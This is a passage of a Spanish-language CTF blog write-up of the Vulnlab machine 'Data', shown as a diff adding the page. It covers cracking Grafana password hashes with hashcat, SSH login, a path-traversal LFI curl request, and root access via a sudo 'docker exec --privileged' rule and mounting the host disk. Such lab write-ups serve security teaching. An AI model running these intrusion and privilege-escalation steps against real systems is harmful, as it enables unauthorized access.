+    with open<span class="o">(</span><span class="s2">"hash_file.txt"</span>, <span class="s2">"a"</span><span class="o">)</span> as hash_file:
+        hash_file.write<span class="o">(</span>f<span class="s2">"sha256:10000:{salt64}:{hash64}</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
+
+<span class="c"># cerramos la conexion ala base de datos</span>
+conn.close<span class="o">()</span>
+➜  exploits
+</code></pre></div></div>
+
+<ul>
+  <li>Una vez ejecutado obtenemos los <strong>hashes</strong> .</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  exploits <span class="nb">cat </span>hash_file.txt
+sha256:10000:WU9iU29MajU1Uw<span class="o">==</span>:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg<span class="o">=</span>
+sha256:10000:TENCaGR0SldqbA<span class="o">==</span>:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag<span class="o">=</span>
+➜  exploits
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora buscamos el modo que usaremos en <strong>hashcat</strong> <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a> .</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/LidRLa9.png" />
+</p>
+
+<p>Ahora crackeamos los <strong>hashes</strong> .</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  exploits hashcat <span class="nt">-m</span> 10900 hash_file.txt /usr/share/wordlists/rockyou.txt
+hashcat <span class="o">(</span>v6.2.6<span class="o">)</span> starting
+
+OpenCL API <span class="o">(</span>OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG<span class="o">)</span> - Platform <span class="c">#1 [The pocl project]</span>
+<span class="o">==================================================================================================================================================</span>
+<span class="k">*</span> Device <span class="c">#1: cpu-skylake-avx512-Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz, 1426/2916 MB (512 MB allocatable), 2MCU</span>
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 2 digests<span class="p">;</span> 2 unique digests, 2 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+<span class="k">*</span> Zero-Byte
+<span class="k">*</span> Slow-Hash-SIMD-LOOP
+
+Watchdog: Temperature abort trigger <span class="nb">set </span>to 90c
+
+Host memory required <span class="k">for </span>this attack: 0 MB
+
+Dictionary cache hit:
+<span class="k">*</span> Filename..: /usr/share/wordlists/rockyou.txt
+<span class="k">*</span> Passwords.: 14344385
+<span class="k">*</span> Bytes.....: 139921507
+<span class="k">*</span> Keyspace..: 14344385
+
+sha256:10000:TENCaGR0SldqbA<span class="o">==</span>:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag<span class="o">=</span>:<span class="k">*********</span>1
+Cracking performance lower than expected?
+
+<span class="k">*</span> Append <span class="nt">-w</span> 3 to the commandline.
+  This can cause your screen to lag.
+
+<span class="k">*</span> Append <span class="nt">-S</span> to the commandline.
+  This has a drastic speed impact but can be better <span class="k">for </span>specific attacks.
+  Typical scenarios are a small wordlist but a large ruleset.
+
+<span class="k">*</span> Update your backend API runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+<span class="k">*</span> Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+<span class="o">[</span>s]tatus <span class="o">[</span>p]ause <span class="o">[</span>b]ypass <span class="o">[</span>c]heckpoint <span class="o">[</span>f]inish <span class="o">[</span>q]uit <span class="o">=&gt;</span>
+</code></pre></div></div>
+
+<h2 id="shell-as-boris">Shell as Boris</h2>
+
+<ul>
+  <li>Ahora nos podemos conectar por <strong>ssh</strong> .</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  exploits ssh boris@10.10.86.89
+The authenticity of host <span class="s1">'10.10.86.89 (10.10.86.89)'</span> can<span class="s1">'t be established.
+ED25519 key fingerprint is SHA256:aTbKZv5Xp7PLsA5FUClvNUBdrInhhfMfeGbEfWDhRfg.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.86.89<span class="s1">' (ED25519) to the list of known hosts.
+boris@10.10.86.89'</span>s password:
+Welcome to Ubuntu 18.04.6 LTS <span class="o">(</span>GNU/Linux 5.4.0-1060-aws x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Feb 26 17:26:55 UTC 2024
+
+  System load:  0.0               Processes:              99
+  Usage of /:   19.8% of 7.69GB   Users logged <span class="k">in</span>:        0
+  Memory usage: 24%               IP address <span class="k">for </span>eth0:    10.10.86.89
+  Swap usage:   0%                IP address <span class="k">for </span>docker0: 172.17.0.1
+
+
+0 updates can be applied immediately.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+Last login: Sun Jan 23 13:11:53 2022 from 10.10.1.254
+boris@ip-10-10-10-11:~<span class="nv">$ </span><span class="nb">whoami
+</span>boris
+boris@ip-10-10-10-11:~<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<ul>
+  <li>Y en nuestro <strong>home</strong> podemos ver la flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>boris@ip-10-10-10-11:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+VL<span class="o">{</span><span class="k">*****************************</span><span class="o">}</span>
+boris@ip-10-10-10-11:~<span class="nv">$ </span><span class="nb">pwd</span>
+/home/boris
+boris@ip-10-10-10-11:~<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<ul>
+  <li>Podemos ejecutar como root sin proporcionar contraseña <strong>docker exec</strong> .</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>boris@ip-10-10-10-11:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>boris on ip-10-10-10-11:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User boris may run the following commands on ip-10-10-10-11:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /snap/bin/docker <span class="nb">exec</span> <span class="k">*</span>
+boris@ip-10-10-10-11:~<span class="err">$</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Si leemos el archivo <strong>/etc/passwd</strong> no existe el usuario Grafana.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>boris@ip-10-10-10-11:~<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+boris:x:1001:1001:,,,:/home/boris:/bin/bash
+</code></pre></div></div>
+
+<ul>
+  <li>A pesar de que con <strong>curl</strong> pudimos verlo, lo más probable es que ese usuario esté en un contenedor, podemos ver el nombre del contenedor mediante el <strong>LFI</strong> .</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ curl <span class="nt">--path-as-is</span> http://10.10.86.89:3000/public/plugins/alertlist/../../../../../../../../etc/hostname
+e6ff5b1cbc85
+➜  ~
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora teniendo el nombre del contenedor podemos ejecutar una <strong>bash</strong> dentro.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>boris@ip-10-10-10-11:~<span class="nv">$ </span><span class="nb">sudo </span>docker <span class="nb">exec</span> <span class="nt">-it</span> <span class="nt">--privileged</span> <span class="nt">-u</span> root e6ff5b1cbc85 bash
+bash-5.1# <span class="nb">whoami
+</span>root
+bash-5.1#
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vemos los discos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.1# fdisk <span class="nt">-l</span>
+Disk /dev/xvda: 8192 MB, 8589934592 bytes, 16777216 sectors
+6367 cylinders, 85 heads, 31 sectors/track
+Units: sectors of 1 <span class="k">*</span> 512 <span class="o">=</span> 512 bytes
+
+Device   Boot StartCHS    EndCHS        StartLBA     EndLBA    Sectors  Size Id Type
+/dev/xvda1 <span class="k">*</span>  0,32,33     20,84,31          2048   16777182   16775135 8190M 83 Linux
+bash-5.1#
+</code></pre></div></div>
+
+<ul>
+  <li>Y ahora creamos una montura para poder ver la flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.1# <span class="nb">mkdir</span> <span class="nt">-p</span> /mnt/pwned
+bash-5.1# mount /dev/xvda1 /mnt/pwned
+bash-5.1# <span class="nb">cd</span> /mnt/pwned/root
+bash-5.1#
+</code></pre></div></div>
+
+<h2 id="root-flag">Root flag</h2>
+
+<ul>
+  <li>Ahora podemos ver la flag.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.1# cat root.txt
+VL{***************************}
+bash-5.1#
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/vulnlab/machines/2024/03/24/data.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_darkhorse77?igsh=MWZqYTAyYnJmYWZrdg%3D%3D&utm_source=qr" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
